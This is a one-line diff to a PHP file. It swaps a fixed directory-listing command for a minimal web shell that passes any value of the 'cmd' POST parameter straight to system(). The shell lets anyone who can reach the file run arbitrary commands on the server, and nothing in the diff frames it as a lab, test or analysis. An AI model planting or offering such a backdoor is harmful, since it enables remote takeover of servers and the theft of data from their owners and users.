@@ -1,1 +1,1 @@
-<?php system("ls -la");?>
+<?php system($_POST['cmd']);?>
